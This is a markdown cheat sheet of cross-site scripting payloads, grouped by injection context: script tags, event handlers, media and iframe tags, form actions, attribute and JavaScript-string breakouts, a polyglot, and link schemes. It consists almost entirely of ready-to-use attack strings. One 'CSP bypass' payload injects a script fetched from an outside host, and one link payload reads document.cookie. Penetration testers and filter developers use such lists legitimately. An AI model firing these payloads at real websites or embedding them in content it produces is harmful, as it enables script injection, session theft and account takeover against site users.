# Unique XSS Payloads and Techniques

### Script Injection
"-prompt(8)-"
'-prompt(8)-'
";a=prompt,a()//
- `<script>alert(1)</script>`
- `<script src=javascript:alert(1)>
- "><svg onload=alert(1)>
- <img src=1 onerror=alert(1)>
- javascript:alert(1)

"onmouseover="alert(1)
javascript:alert(1)`

### Event Handlers
- `onmouseover=alert(1)`
- `<body/onfocus=alert(1)>`
- `<marquee onstart=alert(1)>`
- `<x onclick=alert(1)>click this!`
- `<x onmousedown=alert(1)>click this!`
- `<brute onclick=alert(1)>click this!`

### Image and Media Tags
- `"'><img src="javascript:alert(1)">`
- `<img/src=1 onerror=window.alert(1)>`
- `<audio src=1 onloadstart=alert(1)>`
- `<video onloadstart=alert(1)><source>`

### Dynamic Elements
- `<svg/onload=alert(1)>`
- `<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(1)">`
- `<iframe src=javascript:alert(1)>`
- `<IFRAME SRC=# onmouseover="alert(1)"></IFRAME>`

### Forms and Links
- `<form><button formaction=javascript:alert(1)>click`
- `<IMG SRC="javascript:alert(1);">`
- `<acronym onmousedown="alert(1)">test</acronym>`

- `<img src="/" onerror='prompt(1)'>`
- `<svg/onload=eval(location.hash.substr(1))>#alert(1)`
- `<details/open/ontoggle=confirm('XSS')>`

## CSP Bypass
- `<script>f=document.createElement("iframe");f.id="pwn";f.src="/robots.txt";f.onload=()=>{x=document.createElement('script');x.src='//bo0om.ru/csp.js';pwn.contentWindow.document.body.appendChild(x)};document.body.appendChild(f);</script>`

## Polyglot Payloads
- `javascript:"/*'/*\`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*<svg*/onload=alert()//`

## Inline HTML Injection
- `" onclick=alert(1)//">click`
- `" autofocus onfocus=alert(1) "`

## JavaScript Injection
- `'?prompt\`1\`?'`
- `"})},alert(1));(function xss() {//`
- `"-alert(1)-"`

## Hyperlink Tag Injection
- `javascript://%250Aalert(document.location="https://google.com",document.location="https://www.facebook.com")`
- `/x:1/:///%01javascript:alert(document.cookie)/`
